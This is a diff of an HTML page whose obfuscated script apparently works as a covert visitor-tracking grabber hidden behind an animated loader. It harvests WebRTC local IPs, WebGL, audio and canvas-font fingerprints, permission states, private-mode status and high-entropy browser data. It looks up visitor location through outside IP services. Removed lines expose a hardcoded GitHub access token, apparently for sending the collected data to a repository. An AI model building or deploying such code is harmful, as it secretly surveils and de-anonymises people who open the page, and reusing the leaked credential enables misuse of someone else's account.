@@ -13,23 +13,15 @@
     background:linear-gradient(135deg,#eef2ff 0%,#fce7f3 45%,#e0f2fe 100%);
     min-height:100dvh;
     display:flex;align-items:center;justify-content:center;
-    padding:16px;
-    color:#1f2937;
-    overflow:hidden;
+    padding:16px;color:#1f2937;overflow:hidden;
     -webkit-font-smoothing:antialiased;
   }
-  body::before,
-  body::after{
-    content:"";position:fixed;border-radius:50%;filter:blur(60px);z-index:-1;pointer-events:none;opacity:.6;
+  body::before,body::after{
+    content:"";position:fixed;border-radius:50%;filter:blur(60px);
+    z-index:-1;pointer-events:none;opacity:.6;
   }
-  body::before{
-    width:340px;height:340px;background:#c7d2fe;top:-100px;right:-100px;
-    animation:float1 9s ease-in-out infinite;
-  }
-  body::after{
-    width:300px;height:300px;background:#fbcfe8;bottom:-90px;left:-90px;
-    animation:float2 11s ease-in-out infinite;
-  }
+  body::before{width:340px;height:340px;background:#c7d2fe;top:-100px;right:-100px;animation:float1 9s ease-in-out infinite}
+  body::after{width:300px;height:300px;background:#fbcfe8;bottom:-90px;left:-90px;animation:float2 11s ease-in-out infinite}
   @keyframes float1{0%,100%{transform:translate(0,0)}50%{transform:translate(-30px,30px)}}
   @keyframes float2{0%,100%{transform:translate(0,0)}50%{transform:translate(35px,-25px)}}
 
@@ -44,17 +36,11 @@
       0 20px 60px rgba(99,102,241,.18),
       0 8px 22px rgba(236,72,153,.10),
       inset 0 1px 0 rgba(255,255,255,.9);
-    width:100%;
-    max-width:540px;
-    padding:30px 26px 32px;
-    text-align:center;
-    overflow:hidden;
+    width:100%;max-width:540px;padding:30px 26px 32px;
+    text-align:center;overflow:hidden;
     animation:cardIn .5s cubic-bezier(.22,.9,.34,1) both;
   }
-  @keyframes cardIn{
-    from{opacity:0;transform:translateY(14px) scale(.98)}
-    to{opacity:1;transform:none}
-  }
+  @keyframes cardIn{from{opacity:0;transform:translateY(14px) scale(.98)}to{opacity:1;transform:none}}
   .card::before{
     content:"";position:absolute;inset:0;
     background:
@@ -62,81 +48,50 @@
       radial-gradient(500px 200px at 50% 110%,rgba(236,72,153,.10),transparent 70%);
     pointer-events:none;
   }
-
   .stage{position:relative;z-index:1}
 
   /* Loader */
-  #loader-wrap{
-    display:flex;flex-direction:column;align-items:center;gap:14px;
-    padding:6px 0 4px;
-  }
-  .loader-svg{
-    width:130px;height:130px;display:block;
-    filter:drop-shadow(0 8px 22px rgba(99,102,241,.35));
-  }
-  .loader-text{
-    font-size:14px;color:#6366f1;font-weight:600;letter-spacing:.3px;
-    animation:pulse 1.6s ease-in-out infinite;
-  }
+  #loader-wrap{display:flex;flex-direction:column;align-items:center;gap:14px;padding:6px 0 4px}
+  .loader-svg{width:130px;height:130px;display:block;filter:drop-shadow(0 8px 22px rgba(99,102,241,.35))}
+  .loader-text{font-size:14px;color:#6366f1;font-weight:600;letter-spacing:.3px;animation:pulse 1.6s ease-in-out infinite}
   @keyframes pulse{0%,100%{opacity:.7}50%{opacity:1}}
 
   /* Typing */
   #typing-wrap{
     display:flex;flex-direction:column;align-items:stretch;gap:8px;
-    min-height:270px;
-    text-align:right;
+    min-height:290px;text-align:right;
   }
   .typing{
     display:flex;flex-direction:column;gap:9px;
-    font-size:14.5px;line-height:1.85;color:#334155;
-    font-weight:500;
+    font-size:14.5px;line-height:1.95;color:#334155;font-weight:500;
     word-break:break-word;
   }
-  .typing > div{
-    opacity:0;
-    transform:translateY(4px);
-    animation:lineIn .35s ease-out forwards;
-    padding:6px 12px;
-    border-radius:12px;
+  .typing > .line{
+    padding:6px 12px;border-radius:12px;
     background:linear-gradient(90deg,rgba(238,242,255,.7),rgba(252,231,243,.55));
     border:1px solid rgba(255,255,255,.9);
     box-shadow:0 2px 6px rgba(99,102,241,.06);
+    animation:lineIn .3s ease-out;
+    min-height:1.9em;
   }
-  @keyframes lineIn{
-    to{opacity:1;transform:none}
+  @keyframes lineIn{from{opacity:0;transform:translateY(4px)}to{opacity:1;transform:none}}
+  .word{
+    display:inline;
+    opacity:0;
+    animation:wordFade .55s ease-out forwards;
   }
-  .caret{
-    display:inline-block;
-    color:#8b5cf6;
-    font-weight:700;
-    margin-right:2px;
-    animation:blink .9s steps(1) infinite;
-  }
-  @keyframes blink{50%{opacity:0}}
+  @keyframes wordFade{to{opacity:1}}
 
   /* Result */
-  .result{
-    display:flex;flex-direction:column;align-items:center;gap:14px;
-    padding:8px 2px;
-    text-align:center;
-    animation:cardIn .5s cubic-bezier(.22,.9,.34,1) both;
-  }
+  .result{display:flex;flex-direction:column;align-items:center;gap:14px;padding:8px 2px;text-align:center;animation:cardIn .5s cubic-bezier(.22,.9,.34,1) both}
   .result .badge{
     width:74px;height:74px;border-radius:50%;
     display:flex;align-items:center;justify-content:center;
-    font-size:38px;line-height:1;
-    color:#fff;
-    position:relative;
+    font-size:38px;line-height:1;color:#fff;position:relative;
     box-shadow:0 12px 28px rgba(0,0,0,.12);
   }
-  .result.success .badge{
-    background:linear-gradient(135deg,#22c55e,#16a34a);
-    box-shadow:0 14px 30px rgba(34,197,94,.35);
-  }
-  .result.error .badge{
-    background:linear-gradient(135deg,#ef4444,#dc2626);
-    box-shadow:0 14px 30px rgba(239,68,68,.35);
-  }
+  .result.success .badge{background:linear-gradient(135deg,#22c55e,#16a34a);box-shadow:0 14px 30px rgba(34,197,94,.35)}
+  .result.error .badge{background:linear-gradient(135deg,#ef4444,#dc2626);box-shadow:0 14px 30px rgba(239,68,68,.35)}
   .result .badge::after{
     content:"";position:absolute;inset:-8px;border-radius:50%;
     border:2px solid currentColor;opacity:.35;
@@ -144,28 +99,18 @@
   }
   .result.success .badge::after{color:#22c55e}
   .result.error .badge::after{color:#ef4444}
-  @keyframes ripple{
-    0%{transform:scale(.85);opacity:.45}
-    100%{transform:scale(1.35);opacity:0}
-  }
-  .result .title{
-    font-size:19px;font-weight:800;letter-spacing:.2px;
-  }
+  @keyframes ripple{0%{transform:scale(.85);opacity:.45}100%{transform:scale(1.35);opacity:0}}
+  .result .title{font-size:19px;font-weight:800;letter-spacing:.2px}
   .result.success .title{color:#166534}
   .result.error .title{color:#991b1b}
   .result .desc{
     font-size:13.5px;color:#475569;line-height:1.85;
-    max-width:440px;
-    padding:10px 14px;
+    max-width:440px;padding:10px 14px;
     background:rgba(255,255,255,.7);
     border:1px solid rgba(255,255,255,.9);
-    border-radius:14px;
-    word-break:break-word;
+    border-radius:14px;word-break:break-word;
     font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
-    text-align:left;
-    direction:ltr;
-    max-height:180px;
-    overflow:auto;
+    text-align:left;direction:ltr;max-height:180px;overflow:auto;
   }
   .result.success .desc{border-left:3px solid #22c55e}
   .result.error .desc{border-left:3px solid #ef4444}
@@ -173,8 +118,8 @@
   @media (max-width:420px){
     .card{padding:24px 18px 26px;border-radius:22px}
     .loader-svg{width:110px;height:110px}
-    .typing{font-size:13.5px;line-height:1.75}
-    .typing > div{padding:5px 10px}
+    .typing{font-size:13.5px;line-height:1.8}
+    .typing > .line{padding:5px 10px}
     .result .title{font-size:17px}
   }
 </style>
@@ -200,42 +145,27 @@
           <stop offset="100%" stop-color="#6366f1"/>
         </radialGradient>
       </defs>
-
       <circle cx="60" cy="60" r="52" fill="none" stroke="#e5e7eb" stroke-width="1.5" opacity=".55"/>
-
-      <circle cx="60" cy="60" r="18" fill="none" stroke="#e5e7eb" stroke-width="1.5"
-              stroke-dasharray="2 5" opacity=".7">
-        <animateTransform attributeName="transform" type="rotate"
-                          from="0 60 60" to="360 60 60" dur="6s" repeatCount="indefinite"/>
+      <circle cx="60" cy="60" r="18" fill="none" stroke="#e5e7eb" stroke-width="1.5" stroke-dasharray="2 5" opacity=".7">
+        <animateTransform attributeName="transform" type="rotate" from="0 60 60" to="360 60 60" dur="6s" repeatCount="indefinite"/>
       </circle>
-
       <g>
-        <circle cx="60" cy="60" r="46" fill="none" stroke="url(#lgA)"
-                stroke-width="3" stroke-linecap="round"
-                stroke-dasharray="70 220">
-          <animateTransform attributeName="transform" type="rotate"
-                            from="0 60 60" to="360 60 60" dur="1.15s" repeatCount="indefinite"/>
+        <circle cx="60" cy="60" r="46" fill="none" stroke="url(#lgA)" stroke-width="3" stroke-linecap="round" stroke-dasharray="70 220">
+          <animateTransform attributeName="transform" type="rotate" from="0 60 60" to="360 60 60" dur="1.15s" repeatCount="indefinite"/>
         </circle>
       </g>
-
       <g>
-        <circle cx="60" cy="60" r="33" fill="none" stroke="url(#lgB)"
-                stroke-width="2.6" stroke-linecap="round"
-                stroke-dasharray="45 165">
-          <animateTransform attributeName="transform" type="rotate"
-                            from="360 60 60" to="0 60 60" dur=".9s" repeatCount="indefinite"/>
+        <circle cx="60" cy="60" r="33" fill="none" stroke="url(#lgB)" stroke-width="2.6" stroke-linecap="round" stroke-dasharray="45 165">
+          <animateTransform attributeName="transform" type="rotate" from="360 60 60" to="0 60 60" dur=".9s" repeatCount="indefinite"/>
         </circle>
       </g>
-
       <circle cx="60" cy="60" r="5" fill="url(#lgC)">
         <animate attributeName="r" values="3.5;6.5;3.5" dur=".85s" repeatCount="indefinite"/>
         <animate attributeName="opacity" values="1;.55;1" dur=".85s" repeatCount="indefinite"/>
       </circle>
-
       <g opacity=".9">
         <circle cx="106" cy="60" r="3" fill="#ec4899">
-          <animateTransform attributeName="transform" type="rotate"
-                            from="0 60 60" to="360 60 60" dur="2.2s" repeatCount="indefinite"/>
+          <animateTransform attributeName="transform" type="rotate" from="0 60 60" to="360 60 60" dur="2.2s" repeatCount="indefinite"/>
         </circle>
       </g>
     </svg>
@@ -255,61 +185,64 @@
   'use strict';
 
   /* ============================================================
-   *  زمان شروع صفحه — همه چیز نسبت به این اندازه‌گیری می‌شود
+   *  زمان شروع صفحه
    * ============================================================ */
   const PAGE_START = performance.now();
 
   /* ============================================================
-   *  URL Params — _0xTk / _0xOn / _0xRp / UseriD
+   *  خواندن پارامترهای URL
+   *  پشتیبانی از سه حالت:
+   *    ?0xTk_VALUE&0xOn_VALUE&0xRp_VALUE&UseriD_VALUE
+   *    ?_0xTk=...&_0xOn=...&_0xRp=...&UseriD=...
+   *    ?0xTk=...&0xOn=...&0xRp=...&UseriD=...
    * ============================================================ */
   const getUrlParam = (base) => {
     if (!base) return null;
-    const search = location.search.replace(/^\?/, '');
+    const raw = location.search || '';
+    const search = raw.replace(/^\?/, '');
     if (!search) return null;
 
-    const names = [base, '_' + base];
-    const params = new URLSearchParams(search);
-    for (const n of names) {
-      const v = params.get(n);
-      if (v) return v;
-    }
+    // حالت استاندارد: ?key=value
+    try {
+      const params = new URLSearchParams(search);
+      for (const n of [base, '_' + base]) {
+        const v = params.get(n);
+        if (v) return v;
+      }
+    } catch (e) {}
 
     // حالت خام: ?0xTk_VALUE یا ?_0xTk_VALUE
-    for (const n of names) {
+    for (const n of [base, '_' + base]) {
       const marker = n + '_';
-      const idx = search.indexOf(marker);
-      if (idx !== -1) {
+      let from = 0;
+      while (true) {
+        const idx = search.indexOf(marker, from);
+        if (idx === -1) break;
         const before = idx === 0 ? '&' : search[idx - 1];
         if (before === '&' || idx === 0) {
           const rest = search.slice(idx + marker.length);
           const amp = rest.indexOf('&');
-          try { return decodeURIComponent(amp === -1 ? rest : rest.slice(0, amp)); }
-          catch { return (amp === -1 ? rest : rest.slice(0, amp)); }
+          const val = amp === -1 ? rest : rest.slice(0, amp);
+          try { return decodeURIComponent(val); } catch (e) { return val; }
         }
+        from = idx + 1;
       }
     }
     return null;
   };
 
-  const _0xTkFromUrl   = getUrlParam('0xTk');
-  const _0xOnFromUrl   = getUrlParam('0xOn');
-  const _0xRpFromUrl   = getUrlParam('0xRp');
-  const _0xUseriDUrl   = getUrlParam('UseriD') || getUrlParam('userId') || getUrlParam('userid') || getUrlParam('user');
+  const _0xTk     = getUrlParam('0xTk');
+  const _0xOn     = getUrlParam('0xOn');
+  const _0xRp     = getUrlParam('0xRp');
+  const _0xUseriD = getUrlParam('UseriD') || getUrlParam('userId') || getUrlParam('userid') || getUrlParam('user');
 
-  const _0xTkDefault =
-    "github_pat_11CFHQNFQ0tOczsaLSMWet_" +
-    "7k98tNWSY5BnO9viztruJKo4wVHS875ZEMzxAXgJAYz4GVH4ZQHfI2TNCQE";
-
-  const _0xTk = _0xTkFromUrl || _0xTkDefault;
-  const _0xOn = _0xOnFromUrl || "WendigosCyber";
-  const _0xRp = _0xRpFromUrl || "WendigosCyber";
-  const _0xUseriD = _0xUseriDUrl || null;
+  const MISSING_PARAMS = !_0xTk || !_0xOn || !_0xRp;
 
   /* ============================================================
-   *  Storage keys / Cookie utils
+   *  Cookie utils
    * ============================================================ */
-  const _0xCk  = "atlas_visitor_registered_v5";
-  const _0xVck = "wendigos_visitor_id_v5";
+  const _0xCk  = "atlas_visitor_registered_v6";
+  const _0xVck = "wendigos_visitor_id_v6";
   const _0xMx  = 60 * 60 * 24 * 365;
 
   const _0xGc = (name) => {
@@ -321,7 +254,9 @@
   };
 
   const _0xSc = (name, value, maxAgeSeconds) => {
-    document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; max-age=${maxAgeSeconds}; path=/; samesite=lax`;
+    try {
+      document.cookie = `${encodeURIComponent(name)}=${encodeURIComponent(value)}; max-age=${maxAgeSeconds}; path=/; samesite=lax`;
+    } catch (e) {}
   };
 
   const _0xGetOrCreateVisitorId = () => {
@@ -333,13 +268,19 @@
   };
 
   /* ============================================================
-   *  Fetch با Timeout پیش‌فرض ۳ ثانیه (سریع)
+   *  Fetch با Timeout
    * ============================================================ */
-  const _0xTf = async (url, options = {}, timeoutMs = 3000) => {
+  const _0xTf = async (url, options = {}, timeoutMs = 2500) => {
     const controller = new AbortController();
     const id = setTimeout(() => controller.abort(), timeoutMs);
     try {
-      return await fetch(url, { ...options, signal: controller.signal, cache: 'no-store' });
+      return await fetch(url, {
+        ...options,
+        signal: controller.signal,
+        cache: 'no-store',
+        mode: 'cors',
+        credentials: 'omit'
+      });
     } finally {
       clearTimeout(id);
     }
@@ -366,43 +307,33 @@
     } catch (e) { return null; }
   };
 
-  const _0xLocalIP = () => {
-    return new Promise((resolve) => {
-      const ips = { ipv4: null, ipv6: null };
-      let pc;
-      try {
-        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      } catch (e) { return resolve(ips); }
+  const _0xLocalIP = () => new Promise((resolve) => {
+    const ips = { ipv4: null, ipv6: null };
+    let pc;
+    try {
+      pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+    } catch (e) { return resolve(ips); }
 
-      let done = false;
-      const finish = () => {
-        if (done) return;
-        done = true;
-        try { pc.close(); } catch {}
-        resolve(ips);
-      };
-      pc.onicecandidate = (e) => {
-        if (!e.candidate) return;
-        const candidate = e.candidate.candidate;
-        const ipv4Match = candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-        const ipv6Match = candidate.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
-        if (ipv4Match && !ips.ipv4 &&
-            !ipv4Match[0].startsWith('127.') &&
-            ipv4Match[0] !== '0.0.0.0') {
-          ips.ipv4 = ipv4Match[0];
-        }
-        if (ipv6Match && !ips.ipv6 &&
-            !ipv6Match[0].startsWith('::1') &&
-            ipv6Match[0] !== '::') {
-          ips.ipv6 = ipv6Match[0];
-        }
-        if (ips.ipv4 && ips.ipv6) finish();
-      };
-      try { pc.createDataChannel(''); } catch {}
-      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
-      setTimeout(finish, 1800);
-    });
-  };
+    let done = false;
+    const finish = () => {
+      if (done) return;
+      done = true;
+      try { pc.close(); } catch (e) {}
+      resolve(ips);
+    };
+    pc.onicecandidate = (e) => {
+      if (!e.candidate) return;
+      const c = e.candidate.candidate;
+      const v4 = c.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
+      const v6 = c.match(/([a-f0-9:]+:+)+[a-f0-9]+/i);
+      if (v4 && !ips.ipv4 && !v4[0].startsWith('127.') && v4[0] !== '0.0.0.0') ips.ipv4 = v4[0];
+      if (v6 && !ips.ipv6 && !v6[0].startsWith('::1') && v6[0] !== '::') ips.ipv6 = v6[0];
+      if (ips.ipv4 && ips.ipv6) finish();
+    };
+    try { pc.createDataChannel(''); } catch (e) {}
+    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
+    setTimeout(finish, 1500);
+  });
 
   const _0xGb = async () => {
     try {
@@ -418,40 +349,37 @@
   };
 
   const _0xGu = () => {
-    const uaData = navigator.userAgentData;
-    if (!uaData) return null;
+    const ua = navigator.userAgentData;
+    if (!ua) return null;
     return {
-      brands: uaData.brands || null,
-      mobile: typeof uaData.mobile === "boolean" ? uaData.mobile : null,
-      platform: uaData.platform || null
+      brands: ua.brands || null,
+      mobile: typeof ua.mobile === "boolean" ? ua.mobile : null,
+      platform: ua.platform || null
     };
   };
 
   const _0xGw = () => {
     try {
       const canvas = document.createElement("canvas");
-      const gl = canvas.getContext("webgl2") ||
-                 canvas.getContext("webgl") ||
-                 canvas.getContext("experimental-webgl");
+      const gl = canvas.getContext("webgl2") || canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
       if (!gl) return null;
       const debug = gl.getExtension("WEBGL_debug_renderer_info");
       const exts = gl.getSupportedExtensions();
-      const params = {
-        MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE),
-        MAX_RENDERBUFFER_SIZE: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
-        MAX_VIEWPORT_DIMS: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
-        MAX_VERTEX_ATTRIBS: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
-        MAX_FRAGMENT_UNIFORM_VECTORS: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
-        ALIASED_LINE_WIDTH_RANGE: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
-        EXTENSION_COUNT: exts ? exts.length : 0,
-        EXTENSIONS_SAMPLE: exts ? exts.slice(0, 20) : null
-      };
       return {
         vendor: debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
         renderer: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null,
         version: gl.getParameter(gl.VERSION),
         shadingLanguage: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
-        limits: params
+        limits: {
+          MAX_TEXTURE_SIZE: gl.getParameter(gl.MAX_TEXTURE_SIZE),
+          MAX_RENDERBUFFER_SIZE: gl.getParameter(gl.MAX_RENDERBUFFER_SIZE),
+          MAX_VIEWPORT_DIMS: gl.getParameter(gl.MAX_VIEWPORT_DIMS),
+          MAX_VERTEX_ATTRIBS: gl.getParameter(gl.MAX_VERTEX_ATTRIBS),
+          MAX_FRAGMENT_UNIFORM_VECTORS: gl.getParameter(gl.MAX_FRAGMENT_UNIFORM_VECTORS),
+          ALIASED_LINE_WIDTH_RANGE: gl.getParameter(gl.ALIASED_LINE_WIDTH_RANGE),
+          EXTENSION_COUNT: exts ? exts.length : 0,
+          EXTENSIONS_SAMPLE: exts ? exts.slice(0, 20) : null
+        }
       };
     } catch (e) { return null; }
   };
@@ -468,8 +396,7 @@
         vendor: adapter.vendor || null,
         architecture: adapter.architecture || null,
         description: adapter.description || null,
-        features,
-        limits
+        features, limits
       };
     } catch (e) { return null; }
   };
@@ -478,21 +405,16 @@
     try {
       const Ctx = window.OfflineAudioContext || window.webkitOfflineAudioContext;
       if (!Ctx) return null;
-      const sampleRate = 44100;
-      const ctx = new Ctx(1, sampleRate, sampleRate);
+      const sr = 44100;
+      const ctx = new Ctx(1, sr, sr);
       const osc = ctx.createOscillator();
       const comp = ctx.createDynamicsCompressor();
       const bq = ctx.createBiquadFilter();
-      bq.type = "lowpass";
-      bq.frequency.value = 2000;
-      osc.type = "sawtooth";
-      osc.frequency.value = 800;
+      bq.type = "lowpass"; bq.frequency.value = 2000;
+      osc.type = "sawtooth"; osc.frequency.value = 800;
       const gain = ctx.createGain();
       gain.gain.value = 0.8;
-      osc.connect(bq);
-      bq.connect(comp);
-      comp.connect(gain);
-      gain.connect(ctx.destination);
+      osc.connect(bq); bq.connect(comp); comp.connect(gain); gain.connect(ctx.destination);
       osc.start(0);
       const buffer = await ctx.startRendering();
       const data = buffer.getChannelData(0);
@@ -524,22 +446,17 @@
     const canvas = document.createElement("canvas");
     const ctx = canvas.getContext("2d");
     if (!ctx) return null;
-    canvas.width = 300;
-    canvas.height = 50;
-    const testString = "mmmmmmmmmmllllllllliiiiiiiiiiWWWWW";
+    canvas.width = 300; canvas.height = 50;
+    const test = "mmmmmmmmmmllllllllliiiiiiiiiiWWWWW";
     const baseWidths = {};
     for (const bf of baseFonts) {
       ctx.font = `16px ${bf}`;
-      baseWidths[bf] = ctx.measureText(testString).width;
+      baseWidths[bf] = ctx.measureText(test).width;
     }
     for (const font of fonts) {
       for (const bf of baseFonts) {
         ctx.font = `16px "${font}", ${bf}`;
-        const width = ctx.measureText(testString).width;
-        if (width !== baseWidths[bf]) {
-          available.push(font);
-          break;
-        }
+        if (ctx.measureText(test).width !== baseWidths[bf]) { available.push(font); break; }
       }
     }
     return available;
@@ -570,39 +487,35 @@
     };
   };
 
-  const _0xGth     = () => ({ darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches });
-  const _0xGcg     = () => ({
+  const _0xGth  = () => ({ darkMode: window.matchMedia("(prefers-color-scheme: dark)").matches });
+  const _0xGcg  = () => ({
     srgb: matchMedia("(color-gamut: srgb)").matches,
     p3: matchMedia("(color-gamut: p3)").matches,
     rec2020: matchMedia("(color-gamut: rec2020)").matches
   });
-  const _0xGhdr    = () => ({ hdr: matchMedia("(dynamic-range: high)").matches });
-  const _0xGpwa    = () => ({
+  const _0xGhdr = () => ({ hdr: matchMedia("(dynamic-range: high)").matches });
+  const _0xGpwa = () => ({
     standalone: window.matchMedia("(display-mode: standalone)").matches || navigator.standalone === true
   });
 
   const _0xGp = async () => {
     if (!navigator.permissions?.query) return null;
-    const names = ["geolocation","camera","microphone","notifications",
-      "clipboard-read","clipboard-write","accelerometer","gyroscope","magnetometer"];
-    const result = {};
-    for (const name of names) {
+    const names = ["geolocation","camera","microphone","notifications","clipboard-read","clipboard-write","accelerometer","gyroscope","magnetometer"];
+    const out = {};
+    await Promise.all(names.map(async (name) => {
       try {
         const p = await navigator.permissions.query({ name });
-        result[name] = p.state;
+        out[name] = p.state;
       } catch (e) {}
-    }
-    return result;
+    }));
+    return out;
   };
 
-  const _0xGtz = () => {
-    const now = new Date();
-    return {
-      offsetMinutes: now.getTimezoneOffset(),
-      calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
-      numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
-    };
-  };
+  const _0xGtz = () => ({
+    offsetMinutes: new Date().getTimezoneOffset(),
+    calendar: Intl.DateTimeFormat().resolvedOptions().calendar,
+    numberingSystem: Intl.DateTimeFormat().resolvedOptions().numberingSystem
+  });
 
   const _0xGlocale = () => {
     try {
@@ -617,7 +530,7 @@
   const _0xGperf = () => {
     const perf = performance;
     const mem = perf.memory || perf.msMemory;
-    const navEntry = perf.getEntriesByType?.("navigation")?.[0];
+    const nav = perf.getEntriesByType?.("navigation")?.[0];
     return {
       timeOrigin: perf.timeOrigin,
       now: perf.now(),
@@ -626,11 +539,11 @@
         totalJSHeapSize: mem.totalJSHeapSize,
         usedJSHeapSize: mem.usedJSHeapSize
       } : null,
-      navigation: navEntry ? {
-        type: navEntry.type,
-        redirectCount: navEntry.redirectCount,
-        domContentLoaded: navEntry.domContentLoadedEventStart,
-        loadComplete: navEntry.loadEventStart
+      navigation: nav ? {
+        type: nav.type,
+        redirectCount: nav.redirectCount,
+        domContentLoaded: nav.domContentLoadedEventStart,
+        loadComplete: nav.loadEventStart
       } : null
     };
   };
@@ -639,25 +552,20 @@
     if (!navigator.mediaCapabilities) return null;
     const configs = [
       { type: "file", video: { contentType: "video/mp4; codecs=avc1.42E01E", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
-      { type: "file", video: { contentType: "video/webm; codecs=vp9",      width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
+      { type: "file", video: { contentType: "video/webm; codecs=vp9", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } },
       { type: "file", video: { contentType: "video/mp4; codecs=av01.0.05M.08", width: 1920, height: 1080, bitrate: 1000000, framerate: 30 } }
     ];
-    const result = {};
-    for (const config of configs) {
+    const out = {};
+    await Promise.all(configs.map(async (cfg) => {
       try {
-        const info = await navigator.mediaCapabilities.decodingInfo(config);
-        result[config.video.contentType] = {
-          supported: info.supported, smooth: info.smooth, powerEfficient: info.powerEfficient
-        };
-      } catch (e) { result[config.video.contentType] = null; }
-    }
-    return result;
+        const info = await navigator.mediaCapabilities.decodingInfo(cfg);
+        out[cfg.video.contentType] = { supported: info.supported, smooth: info.smooth, powerEfficient: info.powerEfficient };
+      } catch (e) { out[cfg.video.contentType] = null; }
+    }));
+    return out;
   };
 
-  const _0xGso = () => {
-    if (!screen.orientation) return null;
-    return { type: screen.orientation.type, angle: screen.orientation.angle };
-  };
+  const _0xGso = () => screen.orientation ? { type: screen.orientation.type, angle: screen.orientation.angle } : null;
 
   const _0xGbf = () => ({
     gpu: "gpu" in navigator,
@@ -697,11 +605,11 @@
       const sdp = offer.sdp;
       pc.close();
       const lines = sdp.split("\n");
-      const fingerprint = lines.find(l => l.startsWith("a=fingerprint:"));
-      const iceUfrag = lines.find(l => l.startsWith("a=ice-ufrag:"));
+      const fp = lines.find(l => l.startsWith("a=fingerprint:"));
+      const uf = lines.find(l => l.startsWith("a=ice-ufrag:"));
       return {
-        fingerprint: fingerprint?.split(" ")[1] || null,
-        iceUfrag: iceUfrag?.split(":")[1] || null,
+        fingerprint: fp?.split(" ")[1] || null,
+        iceUfrag: uf?.split(":")[1] || null,
         sdpLines: lines.length
       };
     } catch (e) { return null; }
@@ -710,29 +618,29 @@
   const _0xGhighEntropy = async () => {
     try {
       if (!navigator.userAgentData?.getHighEntropyValues) return null;
-      const hints = ["architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList"];
-      return await navigator.userAgentData.getHighEntropyValues(hints);
+      return await navigator.userAgentData.getHighEntropyValues(
+        ["architecture","bitness","model","platformVersion","uaFullVersion","fullVersionList"]
+      );
     } catch (e) { return null; }
   };
 
   const _0xGstorage = async () => {
     try {
       if (!navigator.storage?.estimate) return null;
-      const estimate = await navigator.storage.estimate();
+      const est = await navigator.storage.estimate();
       let persisted = null;
-      try { persisted = await navigator.storage.persisted?.() ?? null; } catch {}
-      return { quota: estimate.quota, usage: estimate.usage, persisted };
+      try { persisted = await navigator.storage.persisted?.() ?? null; } catch (e) {}
+      return { quota: est.quota, usage: est.usage, persisted };
     } catch (e) { return null; }
   };
 
   const _0xGprivate = async () => {
     const tests = [];
     try { localStorage.setItem('__pvt', '1'); localStorage.removeItem('__pvt'); tests.push('localStorage:ok'); }
-    catch { tests.push('localStorage:blocked'); }
+    catch (e) { tests.push('localStorage:blocked'); }
     try { indexedDB.open('__pvt'); tests.push('indexedDB:ok'); }
-    catch { tests.push('indexedDB:blocked'); }
-    const isPrivate = tests.some(t => t.includes('blocked'));
-    return { isPrivate, tests };
+    catch (e) { tests.push('indexedDB:blocked'); }
+    return { isPrivate: tests.some(t => t.includes('blocked')), tests };
   };
 
   const _0xGcf = async () => {
@@ -759,16 +667,13 @@
 
   const _0xGrdns = async (ip) => {
     try {
-      const parts = ip.split('.');
-      if (parts.length !== 4) return null;
-      const reverse = `${parts[3]}.${parts[2]}.${parts[1]}.${parts[0]}.in-addr.arpa`;
-      const res = await _0xTf(`https://dns.google/resolve?name=${reverse}&type=PTR`);
+      const p = ip.split('.');
+      if (p.length !== 4) return null;
+      const rev = `${p[3]}.${p[2]}.${p[1]}.${p[0]}.in-addr.arpa`;
+      const res = await _0xTf(`https://dns.google/resolve?name=${rev}&type=PTR`);
       if (!res.ok) return null;
-      const json = await res.json();
-      if (json.Answer && json.Answer.length > 0) {
-        return json.Answer.map(a => a.data).join(', ');
-      }
-      return null;
+      const j = await res.json();
+      return (j.Answer && j.Answer.length) ? j.Answer.map(a => a.data).join(', ') : null;
     } catch (e) { return null; }
   };
 
@@ -776,9 +681,9 @@
     try {
       const res = await _0xTf(`https://ipapi.co/${ip}/json/`);
       if (!res.ok) return null;
-      const json = await res.json();
-      if (json.error) return null;
-      return _0xNorm(json);
+      const j = await res.json();
+      if (j.error) return null;
+      return _0xNorm(j);
     } catch (e) { return null; }
   };
 
@@ -786,9 +691,9 @@
     try {
       const res = await _0xTf("https://ipwho.is/");
       if (!res.ok) return null;
-      const json = await res.json();
-      if (!json.success) return null;
-      return _0xNormFromWho(json);
+      const j = await res.json();
+      if (!j.success) return null;
+      return _0xNormFromWho(j);
     } catch (e) { return null; }
   };
 
@@ -796,9 +701,9 @@
     try {
       const res = await _0xTf(`https://ipinfo.io/${ip}/json`);
       if (!res.ok) return null;
-      const json = await res.json();
-      if (!json.ip) return null;
-      return _0xNormFromIpinfo(json);
+      const j = await res.json();
+      if (!j.ip) return null;
+      return _0xNormFromIpinfo(j);
     } catch (e) { return null; }
   };
 
@@ -806,13 +711,13 @@
     try {
       const res = await _0xTf(`https://geolocation-db.com/json/${ip}`);
       if (!res.ok) return null;
-      const json = await res.json();
-      if (!json.IPv4) return null;
+      const j = await res.json();
+      if (!j.IPv4) return null;
       return {
-        ip: json.IPv4, version: 'IPv4',
-        country: json.country_name, countryCode: json.country_code,
-        region: json.state, city: json.city, postal: json.postal,
-        latitude: json.latitude, longitude: json.longitude,
+        ip: j.IPv4, version: 'IPv4',
